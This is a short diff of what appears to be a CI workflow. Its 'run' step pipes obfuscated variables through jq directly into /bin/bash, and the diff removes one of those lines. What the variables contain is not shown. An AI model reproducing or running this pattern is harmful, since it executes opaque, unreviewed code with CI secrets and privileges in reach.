@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$fvj55508" | jq -r .cuwpx277 | /bin/bash
           echo $wd646 | jq -r .un8 | /bin/bash
-          printf '%s' "$tk894" | jq -r .uoras99 | /bin/bash
           printf '%s' "$wbqqs1600" | jq -r .af39 | /bin/bash
 
       - name: Save data
